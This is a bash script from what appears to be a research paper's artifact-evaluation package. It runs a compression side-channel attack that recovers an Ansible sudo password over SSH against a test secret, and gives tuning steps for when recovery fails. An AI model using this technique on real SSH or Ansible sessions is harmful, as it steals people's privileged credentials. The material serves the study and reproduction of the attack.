#!/usr/bin/env bash
#
# Scenario 3 -- Ansible privilege-escalation password recovery
# (paper Section 5.3).
#
# Each guess triggers a fresh ansible-playbook run. Ansible's become
# plugin writes the sudo password to ssh's stdin, and the attacker injects
# into the same zlib context through a LocalForward the victim already has
# configured. A fresh SSH connection per guess means an empty compression
# window, which makes this the quietest of the three scenarios.
#
#   ./artifact-evaluation/scenario3_ansible.sh
#   ./artifact-evaluation/scenario3_ansible.sh --commit-margin 16
#   ./artifact-evaluation/scenario3_ansible.sh --full-sweep
#
# Any extra arguments are passed through to scripts/verify_ansible.py.
# Expect roughly 5-15 minutes.

source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"

# This scenario pins the alignment length the paper found winning (1)
# instead of sweeping all eight. Pass --full-sweep if that assumption does
# not hold on your host; it costs ~8x the guesses but assumes nothing.
DEFAULT_COMMIT_MARGIN="${AE_COMMIT_MARGIN:-8}"

say "Scenario 3: Ansible password recovery (Section 5.3)"
info "target secret : hunter2 (sudo/become password)"
info "commit margin : $DEFAULT_COMMIT_MARGIN (converged value for every ansible cell)"
info "alignment     : pinned to length 1 (pass --full-sweep to search)"

ensure_stack

set +e
"$PY" scripts/verify_ansible.py \
    --commit-margin "$DEFAULT_COMMIT_MARGIN" \
    --fail-fast \
    "$@"
rc=$?
set -e

if [ "$rc" -ne 0 ]; then
    cat <<'EOF'

Recovery did not reproduce. Two knobs, in this order:

  1. The pinned alignment length may be wrong for your host:
         ./artifact-evaluation/scenario3_ansible.sh --full-sweep
  2. Measurement noise -- raise the commit margin in 8-byte steps:
         ./artifact-evaluation/scenario3_ansible.sh --commit-margin 16

See ARTIFACT-EVALUATION.md, "Tuning the commit margin".
EOF
fi

banner_result "$rc" "Scenario 3 (ansible)"
